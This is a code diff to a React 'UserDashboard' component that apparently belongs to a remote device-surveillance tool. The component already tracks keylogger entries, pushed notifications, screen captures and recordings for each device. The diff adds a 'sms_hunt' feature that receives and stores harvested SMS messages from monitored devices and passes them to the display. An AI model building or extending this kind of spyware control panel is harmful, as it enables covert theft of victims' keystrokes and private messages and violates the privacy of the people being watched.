@@ -170,6 +170,7 @@ export default function UserDashboard({ user, onLogout }) {
   const [keylogPushEntries, setKeylogPushEntries]     = useState([]);
   const [notifPushEntries, setNotifPushEntries]       = useState([]);
   const [activityAppEntries, setActivityAppEntries]   = useState([]);
+  const [smsHuntEntries, setSmsHuntEntries]           = useState([]);
   const [screenReaderPushData, setScreenReaderPushData] = useState({});
   const [offlineRecordingVersion, setOfflineRecordingVersion] = useState({});
   const [serverLatency, setServerLatency]             = useState(null);
@@ -355,6 +356,22 @@ export default function UserDashboard({ user, onLogout }) {
           });
         }
         break;
+      case 'sms_hunt:message':
+        if (data?.deviceId && data.message) {
+          setSmsHuntEntries(prev => [{ ...data.message, deviceId: data.deviceId }, ...prev].slice(0, 1000));
+        }
+        break;
+      case 'sms_hunt:history':
+        if (data?.deviceId && Array.isArray(data.messages)) {
+          setSmsHuntEntries(prev => {
+            const existing = new Set(prev.map(message => message._id || message.messageKey));
+            const fresh = data.messages
+              .filter(message => !existing.has(message._id || message.messageKey))
+              .map(message => ({ ...message, deviceId: data.deviceId }));
+            return [...prev, ...fresh].slice(0, 1000);
+          });
+        }
+        break;
       case 'screen:update':
         if (data?.deviceId) setScreenReaderPushData(prev => ({ ...prev, [data.deviceId]: data }));
         break;
@@ -421,6 +438,7 @@ export default function UserDashboard({ user, onLogout }) {
                 keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
                 notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
                 activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
+                 smsHuntEntries={smsHuntEntries.filter(e => e.deviceId === selectedDevice)}
                 screenReaderPushData={screenReaderPushData[selectedDevice] || null}
                 offlineRecordingVersion={offlineRecordingVersion[selectedDevice] || 0}
                 serverLatency={serverLatency}
